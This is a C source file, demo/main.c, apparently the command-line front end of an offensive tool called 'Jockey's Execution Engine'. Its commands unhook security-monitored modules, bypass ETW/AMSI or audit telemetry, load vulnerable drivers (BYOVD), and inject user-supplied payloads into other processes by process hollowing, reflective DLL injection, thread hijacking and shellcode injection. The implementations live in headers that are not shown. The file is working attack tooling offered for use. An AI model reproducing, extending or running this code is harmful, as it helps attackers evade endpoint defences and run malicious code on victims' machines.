/* ============================================================================
 * Jockey's Execution Engine -- demo/main.c
 * Demo program showcasing all engine capabilities.
 * ============================================================================ */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "injection.h"
#include "api_unhooking.h"
#include "byovd.h"
#include "pal.h"

static void print_banner(void) {
    LOG_INFO("\n");
    LOG_INFO("Jockey Execution Engine\n");
    LOG_INFO("Version 1.0\n");
    LOG_INFO("\n");
}

static void print_usage(const char* prog) {
    LOG_INFO("Usage: %s <command> [options]\n\n", prog);
    LOG_INFO("Commands:\n");
    LOG_INFO("  unhook <module>      Unhook a loaded module (e.g., ntdll.dll, libc.so.6)\n");
    LOG_INFO("  bypass               Bypass telemetry (ETW/AMSI on Windows, audit on Linux)\n");
    LOG_INFO("  load-driver <path>   Load a vulnerable driver (BYOVD)\n");
    LOG_INFO("  unload-driver <name> Unload a driver\n");
    LOG_INFO("  hollow <image> <payload>   Process hollowing injection\n");
    LOG_INFO("  reflect <pid> <payload>    Reflective DLL injection\n");
    LOG_INFO("  hijack <pid> <payload>     Thread hijacking injection\n");
    LOG_INFO("  shellcode <pid> <payload>  Shellcode injection\n");
    LOG_INFO("\n");
}

static void* read_file(const char* path, size_t* out_size) {
    FILE* f = fopen(path, "rb");
    if (!f) { perror("fopen"); return NULL; }
    fseek(f, 0, SEEK_END);
    long size = ftell(f);
    fseek(f, 0, SEEK_SET);
    void* data = malloc(size);
    if (data) {
        if (fread(data, 1, size, f) != (size_t)size) {
            free(data);
            data = NULL;
        } else {
            *out_size = (size_t)size;
        }
    }
    fclose(f);
    return data;
}

int main(int argc, char** argv) {
    print_banner();

    if (argc < 2) {
        print_usage(argv[0]);
        return 1;
    }

    const char* cmd = argv[1];

    if (strcmp(cmd, "unhook") == 0) {
        if (argc < 3) { LOG_INFO("[-] Module name required\n"); return 1; }
        LOG_INFO("[*] Unhooking module: %s\n", argv[2]);
        int ret = unhook_module(argv[2]);
        LOG_INFO("[%s] unhook_module returned %d\n", ret == 0 ? "+" : "!", ret);
        return ret == 0 ? 0 : 1;
    }

    if (strcmp(cmd, "bypass") == 0) {
        LOG_INFO("[*] Bypassing telemetry...\n");
        int ret = bypass_telemetry();
        LOG_INFO("[%s] bypass_telemetry returned %d\n", ret == 0 ? "+" : "!", ret);
        return ret == 0 ? 0 : 1;
    }

    if (strcmp(cmd, "load-driver") == 0) {
        if (argc < 3) { LOG_INFO("[-] Driver path required\n"); return 1; }
        LOG_INFO("[*] Loading driver: %s\n", argv[2]);
        int ret = load_byovd(argv[2]);
        LOG_INFO("[%s] load_byovd returned %d\n", ret == 0 ? "+" : "!", ret);
        return ret == 0 ? 0 : 1;
    }

    if (strcmp(cmd, "unload-driver") == 0) {
        if (argc < 3) { LOG_INFO("[-] Driver name required\n"); return 1; }
        LOG_INFO("[*] Unloading driver: %s\n", argv[2]);
        int ret = unload_byovd(argv[2]);
        LOG_INFO("[%s] unload_byovd returned %d\n", ret == 0 ? "+" : "!", ret);
        return ret == 0 ? 0 : 1;
    }

    if (strcmp(cmd, "hollow") == 0) {
        if (argc < 4) { LOG_INFO("[-] Usage: %s hollow <target_image> <payload_file>\n", argv[0]); return 1; }
        size_t payloadSize = 0;
        void* payload = read_file(argv[3], &payloadSize);
        if (!payload) { LOG_INFO("[-] Failed to read payload\n"); return 1; }

        InjectionConfig cfg = {0};
        cfg.method = INJECT_METHOD_PROCESS_HOLLOWING;
        cfg.targetImage = argv[2];
        cfg.payload = payload;
        cfg.payloadSize = payloadSize;
        cfg.unhookApi = 1;

        LOG_INFO("[*] Performing process hollowing into: %s\n", argv[2]);
        int ret = inject_process(&cfg);
        free(payload);
        LOG_INFO("[%s] Injection returned %d\n", ret == 0 ? "+" : "!", ret);
        return ret == 0 ? 0 : 1;
    }

    if (strcmp(cmd, "reflect") == 0) {
        if (argc < 4) { LOG_INFO("[-] Usage: %s reflect <pid> <payload_file>\n", argv[0]); return 1; }
        size_t payloadSize = 0;
        void* payload = read_file(argv[3], &payloadSize);
        if (!payload) { LOG_INFO("[-] Failed to read payload\n"); return 1; }

        InjectionConfig cfg = {0};
        cfg.method = INJECT_METHOD_REFLECTIVE_DLL;
        cfg.targetPid = (uint32_t)strtoul(argv[2], NULL, 10);
        cfg.payload = payload;
        cfg.payloadSize = payloadSize;
        cfg.unhookApi = 1;

        LOG_INFO("[*] Performing reflective DLL injection into PID: %lu\n", (unsigned long)cfg.targetPid);
        int ret = inject_process(&cfg);
        free(payload);
        LOG_INFO("[%s] Injection returned %d\n", ret == 0 ? "+" : "!", ret);
        return ret == 0 ? 0 : 1;
    }

    if (strcmp(cmd, "hijack") == 0) {
        if (argc < 4) { LOG_INFO("[-] Usage: %s hijack <pid> <payload_file>\n", argv[0]); return 1; }
        size_t payloadSize = 0;
        void* payload = read_file(argv[3], &payloadSize);
        if (!payload) { LOG_INFO("[-] Failed to read payload\n"); return 1; }

        InjectionConfig cfg = {0};
        cfg.method = INJECT_METHOD_THREAD_HIJACKING;
        cfg.targetPid = (uint32_t)strtoul(argv[2], NULL, 10);
        cfg.payload = payload;
        cfg.payloadSize = payloadSize;
        cfg.unhookApi = 1;

        LOG_INFO("[*] Performing thread hijacking into PID: %lu\n", (unsigned long)cfg.targetPid);
        int ret = inject_process(&cfg);
        free(payload);
        LOG_INFO("[%s] Injection returned %d\n", ret == 0 ? "+" : "!", ret);
        return ret == 0 ? 0 : 1;
    }

    if (strcmp(cmd, "shellcode") == 0) {
        if (argc < 4) { LOG_INFO("[-] Usage: %s shellcode <pid> <payload_file>\n", argv[0]); return 1; }
        size_t payloadSize = 0;
        void* payload = read_file(argv[3], &payloadSize);
        if (!payload) { LOG_INFO("[-] Failed to read payload\n"); return 1; }

        InjectionConfig cfg = {0};
        cfg.method = INJECT_METHOD_SHELLCODE;
        cfg.targetPid = (uint32_t)strtoul(argv[2], NULL, 10);
        cfg.payload = payload;
        cfg.payloadSize = payloadSize;
        cfg.unhookApi = 1;

        LOG_INFO("[*] Performing shellcode injection into PID: %lu\n", (unsigned long)cfg.targetPid);
        int ret = inject_process(&cfg);
        free(payload);
        LOG_INFO("[%s] Injection returned %d\n", ret == 0 ? "+" : "!", ret);
        return ret == 0 ? 0 : 1;
    }

    LOG_INFO("[-] Unknown command: %s\n", cmd);
    print_usage(argv[0]);
    return 1;
}
